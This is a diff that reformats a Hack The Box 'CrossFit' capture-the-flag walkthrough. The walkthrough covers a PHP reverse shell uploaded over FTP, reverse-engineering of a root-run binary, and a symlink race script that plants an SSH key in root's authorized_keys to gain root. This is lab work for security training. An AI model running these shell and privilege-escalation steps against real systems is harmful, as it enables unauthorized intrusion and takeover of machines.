@@ -999,11 +887,11 @@ lftp ftpadm@10.10.10.208:/messages> put ~/rev-php.php
 73 bytes transferred
 ```
 
-After a lot of testing, and trying random things I found out that I needed to trigger the message by uploading a file into the `messages` folder after logging in with `ftpadm`. 
+After a lot of testing, and trying random things I found out that I needed to trigger the message by uploading a file into the `messages` folder after logging in with `ftpadm`.
 
-### enumeration as `isaac`
+#### enumeration as `isaac`
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ nc -lvnp 8081                                                                                   1 ⨯
 listening on [any] 8081 ...
@@ -1015,7 +903,7 @@ isaac@crossfit:~$
 
 Finally got a shell back after triggering it by uploading a file to the ftp server
 
-```
+```text
 isaac@crossfit:~$ id
 id
 uid=1000(isaac) gid=1000(isaac) groups=1000(isaac),50(staff),116(ftp),1005(admins)
@@ -1023,7 +911,7 @@ uid=1000(isaac) gid=1000(isaac) groups=1000(isaac),50(staff),116(ftp),1005(admin
 
 there was a new group `staff` that had access to a bunch of files related to selenium
 
-```
+```text
 isaac@crossfit:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 isaac@crossfit:~$ ^Z  
@@ -1039,7 +927,7 @@ isaac@crossfit:~$ export TERM=xterm-256color
 
 upgraded to full tty shell
 
-```
+```text
 isaac@crossfit:~/send_updates$ cd includes
 cd includes
 isaac@crossfit:~/send_updates/includes$ ls -la
@@ -1051,17 +939,18 @@ drwxr-x--- 4 isaac admins 4096 May  9  2020 ..
 -rw-r----- 1 isaac isaac   151 May  5  2020 db.php
 -rw-r----- 1 isaac isaac   520 May  5  2020 functions.php
 ```
+
 I did some investigating to figure out why I had to upload a file to get the code to execute
 
-```
+```text
 <?php
 $msg_dir = "/srv/ftp/messages";
 ?>
 ```
 
-In the `includes` folder there was a file `config.php` that pointed to `/srv/ftp/messages`.  db.php was the same as before
+In the `includes` folder there was a file `config.php` that pointed to `/srv/ftp/messages`. db.php was the same as before
 
-```
+```text
 <?php
 function cleanup()
 {
@@ -1087,7 +976,7 @@ function cleanup()
 
 functions.php explained why my query would be deleted each time
 
-```
+```text
 isaac@crossfit:~/send_updates/vendor/composer$ ps aux
 ps aux
 USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
@@ -1104,9 +993,9 @@ isaac     3309  0.0  0.1   7764  4336 ?        S    17:27   0:00 bash -i
 isaac     3557  0.0  0.0  10632  3144 ?        R    17:42   0:00 ps aux
 ```
 
-In the process output I could see my reverse shells (I tried two different methods)
+In the process output I could see my reverse shells \(I tried two different methods\)
 
-```
+```text
 2021/01/15 18:51:01 FS:                 OPEN | /usr/bin/dbmsg
 2021/01/15 18:51:01 FS:               ACCESS | /usr/bin/dbmsg
 2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/ld-2.28.so
@@ -1152,9 +1041,9 @@ In the process output I could see my reverse shells (I tried two different metho
 2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libffi.so.6.0.4
 ```
 
-Using pspy (with the -f flag to see files as they are accessed) I noticed a program dbmsg that I didnt know
+Using pspy \(with the -f flag to see files as they are accessed\) I noticed a program dbmsg that I didnt know
 
-```
+```text
 isaac@crossfit:~$ man dbmsg
 man dbmsg
 No manual entry for dbmsg
@@ -1162,7 +1051,7 @@ No manual entry for dbmsg
 
 After looking around on the internet for awhile and not finding anything I figured it must be a home-brewed application
 
-```
+```text
 isaac@crossfit:~$ strings /bin/dbmsg
 ...snipped...
 crossfit
@@ -1184,7 +1073,7 @@ void main(void)
 {
   __uid_t _Var1;
   time_t tVar2;
-  
+
   _Var1 = geteuid();
   if (_Var1 != 0) {
     fwrite("This program must be run as root.\n",1,0x22,stderr);
@@ -1199,10 +1088,9 @@ void main(void)
 }
 ```
 
-I opened the program in ghidra and found the main() function.  It ran as root, so this looked to be a possible bet for excalation of privileges. It looked like it checked the current system time, created a random number, then ran the process_data() function. I decided to check there next
+I opened the program in ghidra and found the main\(\) function. It ran as root, so this looked to be a possible bet for excalation of privileges. It looked like it checked the current system time, created a random number, then ran the process\_data\(\) function. I decided to check there next
 
 ```c
-
 void process_data(void)
 
 {
@@ -1222,7 +1110,7 @@ void process_data(void)
   long local_30;
   long local_28;
   long local_20;
-  
+
   local_20 = mysql_init(0);
   if (local_20 == 0) {
     fwrite("mysql_init() failed\n",1,0x14,stderr);
@@ -1299,15 +1187,15 @@ void process_data(void)
 }
 ```
 
-The `process_data()` function opens a connection to the mysql database and logs in, pulls all of the data from the `messages` table, then stores the result in a variable.  It then opens the file `/var/backups/mariadb/comments.zip`.
+The `process_data()` function opens a connection to the mysql database and logs in, pulls all of the data from the `messages` table, then stores the result in a variable. It then opens the file `/var/backups/mariadb/comments.zip`.
 
-```
+```text
 isaac@crossfit:/dev/shm$ cd /var/backups/mariadb
 cd /var/backups/mariadb
 bash: cd: /var/backups/mariadb: Permission denied
 ```
 
-I was unable to access the directory that file was stored in.  
+I was unable to access the directory that file was stored in.
 
 After opening the `messages` table and the zip file, it appears that the program takes each entry in the messages table and creates a file, then adds each file to the zip.
 
@@ -1320,7 +1208,7 @@ void md5sum(void *param_1,int param_2,long param_3)
   EVP_MD *local_20;
   EVP_MD_CTX *local_18;
   uint local_c;
-  
+
   local_18 = (EVP_MD_CTX *)EVP_MD_CTX_new();
   local_20 = EVP_md5();
   EVP_DigestInit_ex(local_18,local_20,(ENGINE *)0x0);
@@ -1335,7 +1223,6 @@ void md5sum(void *param_1,int param_2,long param_3)
   return;
 }
 ```
-
 
 the md5sum function
 
@@ -1355,13 +1242,13 @@ int main(void)
 
 wrote a short function in c that emulated what the program was doing: using the current time, generate a psuedo-random number, then create a file with that name
 
-```
-gcc rand.c -o /dev/shm/rand    
+```text
+gcc rand.c -o /dev/shm/rand
 ```
 
-I compiled the small program, then created a script to run it, linking the file to root's authorized_users (which hopefully I could get to write to a location I could access!)
+I compiled the small program, then created a script to run it, linking the file to root's authorized\_users \(which hopefully I could get to write to a location I could access!\)
 
-```
+```text
 #!/bin/bash
 #testsploit.sh
 echo '#include <stdio.h>' >> rand.c
@@ -1383,9 +1270,9 @@ touch /var/local/testing
 while true; do ln -s /root/.ssh/authorized_keys /var/local/$(echo -n $(./rand)1 | md5sum | cut -d " " -f 1) 2>/dev/null; done
 ```
 
-test script to see if I can write to random location and see if my output appears.  update: test worked...this is final script, automating process because its a pain, and deletes every thing so fast...
+test script to see if I can write to random location and see if my output appears. update: test worked...this is final script, automating process because its a pain, and deletes every thing so fast...
 
-```
+```text
 hank@crossfit:/var/local$ ls -la
 total 36
 drwxrwsr-x  2 root  staff  4096 Mar 19 17:06 .
@@ -1436,9 +1323,9 @@ hank@crossfit:/var/local$ cat *
 cat: d41d8cd98f00b204e9800998ecf8427e: No such file or directory
 ```
 
-my random files that were generated, and then suddenly and swiftly removed by the cleaning crew.  I tried to do a test run, but the files were deleted so fast that I couldn't get the testing file to stick around.  I thought about trying to get the output to redirect to /dev/tcp to show up at a nc listener on my machine, but I was confident that I had made it work and pushed on with trying to get `root` access.
+my random files that were generated, and then suddenly and swiftly removed by the cleaning crew. I tried to do a test run, but the files were deleted so fast that I couldn't get the testing file to stick around. I thought about trying to get the output to redirect to /dev/tcp to show up at a nc listener on my machine, but I was confident that I had made it work and pushed on with trying to get `root` access.
 
-```
+```text
 isaac@crossfit:~$ vi rand.c
 isaac@crossfit:~$ gcc rand.c -o /dev/shm/rand
 isaac@crossfit:~$ ls
@@ -1450,9 +1337,9 @@ rand
 isaac@crossfit:/dev/shm$ chmod +x rand
 ```
 
-I compiled my random file generator then made it executable (removing the evidence of its creation). AFter running it, 
+I compiled my random file generator then made it executable \(removing the evidence of its creation\). AFter running it,
 
-```
+```text
 isaac@crossfit:/var/local$ ls -la
 total 8
 drwxrwsr-x  2 root  staff 4096 Mar 19 16:15 .
@@ -1462,21 +1349,20 @@ lrwxrwxrwx  1 isaac staff   26 Mar 19 16:15 c4ca4238a0b923820dcc509a6f75849b -> 
 
 I ran my script, and saw the file linked to `root`'s `authorized_keys` file in the proper folder, however I was not able to SSH into the machine
 
-```
+```text
 isaac@crossfit:/var/local$ /dev/shm/test.sh
 ERROR 1364 (HY000) at line 1: Field 'name' doesn't have a default value
-
 ```
 
-I scolled up to check the error messages output from my script, and finally saw the error that had been causing me so much trouble...My original script was only inserting my public key into the `messages` field.  The database was not set up to function with `NULL` values in the other fields so it was not working.  It required values in the other fields. 
+I scolled up to check the error messages output from my script, and finally saw the error that had been causing me so much trouble...My original script was only inserting my public key into the `messages` field. The database was not set up to function with `NULL` values in the other fields so it was not working. It required values in the other fields.
 
-```
+```text
 /dev/shm/test.sh: line 2: ./rand: No such file or directory
 ```
 
-The second error message above was caused 
+The second error message above was caused
 
-```
+```text
 MariaDB [crossfit]> DESCRIBE messages;
 +---------+---------------------+------+-----+---------+----------------+
 | Field   | Type                | Null | Key | Default | Extra          |
@@ -1489,9 +1375,9 @@ MariaDB [crossfit]> DESCRIBE messages;
 4 rows in set (0.001 sec)
 ```
 
-After going back to my shell as `hank` and checking `mysql` I realized my problem.  I was getting an error while inserting my key into the database, but since there was a huge spam of output from my script I didn't see it.  I used the `DESCRIBE` command to see the columns in the message table so I could tailor my input better.
+After going back to my shell as `hank` and checking `mysql` I realized my problem. I was getting an error while inserting my key into the database, but since there was a huge spam of output from my script I didn't see it. I used the `DESCRIBE` command to see the columns in the message table so I could tailor my input better.
 
-```
+```text
 MariaDB [crossfit]> insert into messages (id, name, email, message) values (1, "ecdsa-sha2-nistp256", "zweilos", "AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOFDxKT5MSIXS3CMnjSZkAqDM+3+yMnUeK9XvRqNy0GQOpBkPhDiCYZekrPVKVM2jSsHfrMfc4P+bakquSG9g5c=C3NzaC1lZDI1NTE5AAAAIBpM8dQcTJXzXOsciQU22F4qpf1jv/SscvQAu+kz7np1");
 Query OK, 1 row affected (0.001 sec)
 
@@ -1503,10 +1389,9 @@ MariaDB [crossfit]> select * from messages
 |  1 | ecdsa-sha2-nistp256 | zweilos | AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOFDxKT5MSIXS3CMnjSZkAqDM+3+yMnUeK9XvRqNy0GQOpBkPhDiCYZekrPVKVM2jSsHfrMfc4P+bakquSG9g5c=C3NzaC1lZDI1NTE5AAAAIBpM8dQcTJXzXOsciQU22F4qpf1jv/SscvQAu+kz7np1 |
 +----+---------------------+---------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
 1 row in set (0.000 sec)
-
 ```
 
-```
+```text
 hank@crossfit:/var/local$ ls -la
 total 36
 drwxrwsr-x  2 root  staff  4096 Mar 19 17:22 .
@@ -1520,9 +1405,9 @@ lrwxrwxrwx  1 isaac staff    26 Mar 19 17:22 c4ca4238a0b923820dcc509a6f75849b ->
 
 The random file
 
-### Root.txt
+#### Root.txt
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ ssh root@10.10.10.208 -i root.key                                                            130 ⨯
 Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64
@@ -1561,9 +1446,9 @@ root@crossfit:~# cat root.txt
 ee0a62a5b513a67db05897a2ec478c80
 ```
 
-Finally!  I had to keep trying to log in through SSH, as it wasn't until my files got deleted that I was successful.  I was able to tell that my files got deleted because I began getting spammed with an error message
+Finally! I had to keep trying to log in through SSH, as it wasn't until my files got deleted that I was successful. I was able to tell that my files got deleted because I began getting spammed with an error message
 
-```
+```text
 ...snipped...
 ./t: line 19: ./rand: No such file or directory
 ./t: line 19: ./rand: No such file or directory
@@ -1572,11 +1457,11 @@ Finally!  I had to keep trying to log in through SSH, as it wasn't until my file
 ./t: line 19: ./rand: No such file or directory
 ```
 
-AS you can see...I got tired of even typing out `test.sh` and simply called my script `t`.  I almost was about to write another script that would send my files over, chmod +x them, and run the exploit script, but just before I did that the exploit finally worked!
-
+AS you can see...I got tired of even typing out `test.sh` and simply called my script `t`. I almost was about to write another script that would send my files over, chmod +x them, and run the exploit script, but just before I did that the exploit finally worked!
 
 These notes got jumbled up...make sure to clean and reorganize them!
 
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
+Thanks to [`polarbearer`](https://app.hackthebox.eu/users/159204) & [`GibParadox`](https://app.hackthebox.eu/users/125033) for something interesting or useful about this machine.
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
+
